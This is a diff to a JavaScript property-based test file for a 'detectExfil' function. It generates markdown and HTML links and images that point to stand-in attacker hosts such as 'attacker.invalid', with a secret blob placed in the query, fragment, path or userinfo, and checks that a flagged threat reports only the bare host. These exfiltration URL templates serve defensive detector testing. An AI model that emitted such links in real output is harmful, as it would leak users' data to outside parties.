@@ -18,9 +18,10 @@ import { fcRunOptions } from "./test-helpers.mjs";
 
 const runOptions = fcRunOptions({ numRuns: 500 });
 
-// A long opaque blob that stands in for exfiltrated data. 96 base64 chars clears
-// every length threshold, so a URL carrying it in a flaggable position is
-// reliably detected (keeps the host-no-leak property non-vacuous).
+// A long opaque blob standing in for exfiltrated data. ≥210 chars clears every
+// length threshold (path segment > 128, fragment > 200), so all four placement
+// positions below reliably produce a flagged threat — keeping the host-no-leak
+// property non-vacuous across the whole position space, not just the query case.
 const secretBlob = fc
   .array(
     fc.constantFrom(
@@ -28,7 +29,7 @@ const secretBlob = fc
         "",
       ),
     ),
-    { minLength: 96, maxLength: 160 },
+    { minLength: 210, maxLength: 280 },
   )
   .map((chars) => chars.join(""));
 
@@ -38,81 +39,52 @@ const exfilHost = fc.constantFrom(
   "a.b.attacker.invalid",
 );
 
-// Place the secret somewhere urlHost must NOT surface: query value, fragment,
-// path segment, or userinfo password. The host itself never carries the secret,
-// so the postcondition `!target.includes(secret)` is exactly the promise.
-const exfilUrl = fc
+// One case carries a single secret through both the doc and the assertion, so
+// the host-no-leak check is meaningful: the secret sits in the query/fragment/
+// path/userinfo — never the authority — so a correct urlHost returns the bare
+// host and a buggy one that echoed any payload-bearing component would fail
+// `target === host`. (The earlier independent-secret form was vacuous: a 210+
+// char blob can never be a substring of a sub-20-char host regardless of bugs.)
+const exfilCase = fc
   .tuple(
     exfilHost,
     secretBlob,
     fc.constantFrom("query", "fragment", "path", "userinfo"),
+    fc.constantFrom("md-link", "md-image", "html-a", "html-img"),
   )
-  .map(([host, secret, where]) => {
-    switch (where) {
-      case "query":
-        return `https://${host}/p?data=${secret}`;
-      case "fragment":
-        return `https://${host}/p#${secret}`;
-      case "path":
-        return `https://${host}/${secret}`;
-      default:
-        return `https://user:${secret}@${host}/p`;
-    }
-  });
-
-const wrapInDoc = fc
-  .tuple(exfilUrl, fc.constantFrom("md-link", "md-image", "html-a", "html-img"))
-  .map(([url, kind]) => {
-    switch (kind) {
-      case "md-link":
-        return `see [here](${url}) now`;
-      case "md-image":
-        return `look ![alt](${url}) here`;
-      case "html-a":
-        return `<a href="${url}">x</a>`;
-      default:
-        return `<img src="${url}">`;
-    }
+  .map(([host, secret, where, kind]) => {
+    const url = {
+      query: `https://${host}/p?data=${secret}`,
+      fragment: `https://${host}/p#${secret}`,
+      path: `https://${host}/${secret}`,
+      userinfo: `https://user:${secret}@${host}/p`,
+    }[where];
+    const doc = {
+      "md-link": `see [here](${url}) now`,
+      "md-image": `look ![alt](${url}) here`,
+      "html-a": `<a href="${url}">x</a>`,
+      "html-img": `<img src="${url}">`,
+    }[kind];
+    return { host, secret, doc };
   });
 
 describe("property: detectExfil host never echoes the payload", () => {
-  it("a flagged threat's target excludes the secret it carried", () => {
+  it("a flagged threat's target is the bare host, never the payload", () => {
     let sawFlagged = 0;
     fc.assert(
-      fc.property(secretBlob, wrapInDoc, (secret, doc) => {
+      fc.property(exfilCase, ({ host, doc }) => {
         const threats = detectExfil(doc) ?? [];
-        for (const threat of threats) {
-          assert.equal(typeof threat.target, "string");
-          assert.ok(
-            !threat.target.includes(secret),
-            `target leaked the payload: ${JSON.stringify(threat.target)}`,
+        for (const threat of threats)
+          assert.equal(
+            threat.target,
+            host,
+            `target should be the bare host, got ${JSON.stringify(threat.target)}`,
           );
-        }
         if (threats.length > 0) sawFlagged += 1;
       }),
       runOptions,
     );
-    // The doc generator embeds `secret` while the property regenerates its own
-    // `secret`; assert flags fired so the postcondition isn't vacuous. (The two
-    // secrets differ, but the host-no-leak check holds for any payload — what we
-    // need is that detection actually ran on flaggable input.)
     assert.ok(sawFlagged > 0, "no doc was ever flagged — property vacuous");
-  });
-
-  it("the secret embedded in this very doc never reaches a target", () => {
-    fc.assert(
-      fc.property(fc.tuple(exfilHost, secretBlob), ([host, secret]) => {
-        const doc = `[x](https://${host}/p?token=${secret})`;
-        const threats = detectExfil(doc) ?? [];
-        assert.ok(threats.length > 0, "expected a flag on a token= blob");
-        for (const threat of threats)
-          assert.ok(
-            !threat.target.includes(secret),
-            `target leaked the payload: ${JSON.stringify(threat.target)}`,
-          );
-      }),
-      runOptions,
-    );
   });
 });
 
